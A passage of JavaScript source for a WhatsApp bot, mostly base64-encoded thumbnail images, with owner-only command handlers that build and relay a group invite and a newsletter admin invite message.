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",
	"caption": "no cap, no pretending, no need a mentions"
}
}), { userJid: m.chat, quoted: m })
alice.relayMessage(from, groupInvite.message, { messageId: groupInvite.key.id })
}
break
case 'inviteadmin':
if(!isCreator) return reply(mess.owner)
var newsletterAdminInviteMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"newsletterAdminInviteMessage": {
"newsletterJid": global.idsal,
"newsletterName": "Circle Bot Community",
"jpegThumbnail": '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